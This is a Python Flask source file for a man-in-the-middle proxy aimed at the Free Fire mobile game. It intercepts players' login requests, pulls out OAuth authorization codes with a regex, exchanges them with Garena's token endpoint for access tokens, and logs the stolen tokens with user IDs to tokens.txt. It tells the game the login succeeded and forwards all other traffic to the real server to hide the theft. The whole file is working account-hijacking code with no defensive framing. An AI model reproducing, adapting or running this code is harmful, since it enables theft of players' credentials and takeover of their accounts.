from flask import Flask, request, jsonify, Response
import requests
import os
import re
from datetime import datetime

app = Flask(__name__)

# ─── CONFIGURATION ──────────────────────────────────────────────
# The real Garena server URL (for forwarding other requests)
REAL_SERVER = os.environ.get('REAL_SERVER_URL', 'https://client.ind.freefiremobile.com')

# Garena OAuth token endpoint
TOKEN_URL = "https://auth.garena.com/oauth/token"
CLIENT_ID = "100067"

# IMPORTANT: This redirect_uri MUST match the one used when the OAuth code was generated.
# The code is generated during the game's OAuth flow (Google/Facebook login) with this exact redirect_uri.
REDIRECT_URI = "https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/"

active_users = []
# ─────────────────────────────────────────────────────────────────

def extract_oauth_code(raw_data):
    """
    Extract the OAuth code from the raw binary request using regex.
    OAuth codes are typically 30-50 alphanumeric characters (may include - and _).
    """
    pattern = re.compile(rb'[a-zA-Z0-9_-]{30,50}')
    matches = pattern.findall(raw_data)
    for match in matches:
        code = match.decode('utf-8', errors='ignore')
        # Filter out false positives (like long numbers)
        if len(code) >= 30 and not code.isdigit():
            return code
    return None

def exchange_code_for_tokens(code):
    """
    Exchange the OAuth code for tokens using Garena's token endpoint.
    Returns the hex access token if successful, otherwise None.
    """
    payload = {
        "grant_type": "authorization_code",
        "code": code,
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI
    }
    try:
        resp = requests.post(TOKEN_URL, data=payload, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            hex_token = data.get('access_token')
            return hex_token
        else:
            print(f"Exchange failed: {resp.status_code} - {resp.text[:200]}")
            return None
    except Exception as e:
        print(f"Exchange error: {e}")
        return None

@app.route('/user/<user_id>/', defaults={'subpath': ''}, methods=['GET', 'POST'])
@app.route('/user/<user_id>/<path:subpath>', methods=['GET', 'POST'])
def handle_request(user_id, subpath):
    print(f"\n🔹 {request.method} /user/{user_id}/{subpath}")

    if user_id not in active_users:
        active_users.append(user_id)
        print(f"👤 New user: {user_id}")

    # ── Handle GetLoginData – extract code and exchange ──
    if subpath == "GetLoginData":
        raw_data = request.get_data()
        print(f"📦 Received {len(raw_data)} bytes")

        oauth_code = extract_oauth_code(raw_data)

        if oauth_code:
            print(f"🔑 Extracted OAuth code: {oauth_code[:20]}...")
            hex_token = exchange_code_for_tokens(oauth_code)
            if hex_token:
                print(f"🎯 HEX ACCESS TOKEN: {hex_token}")
                # Save to file (tokens.txt)
                with open("tokens.txt", "a") as f:
                    f.write(f"{datetime.now()} | {user_id} | {hex_token}\n")
            else:
                print("❌ No hex token returned from exchange.")
        else:
            print("⚠️ No OAuth code found in request.")

        # Always return success to the game
        return jsonify({"status": "success", "message": "OK"}), 200

    # ── For other requests (Ping, etc.), forward to the real Garena server ──
    try:
        real_url = f"{REAL_SERVER}/{subpath}" if subpath else REAL_SERVER
        headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'connection']}
        headers.pop('Content-Length', None)
        headers['Host'] = 'client.ind.freefiremobile.com'

        resp = requests.request(
            method=request.method,
            url=real_url,
            headers=headers,
            data=request.get_data(),
            params=request.args,
            allow_redirects=False,
            timeout=30
        )
        excluded = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        resp_headers = [(k, v) for k, v in resp.raw.headers.items() if k.lower() not in excluded]
        return Response(resp.content, status=resp.status_code, headers=resp_headers)
    except Exception as e:
        print(f"❌ Forward error: {e}")
        # Fallback: return a generic success to keep the game happy
        return jsonify({"status": "success", "message": "OK"}), 200

@app.route('/')
def admin():
    return jsonify({
        "active_users": active_users,
        "message": "Token capture API running"
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)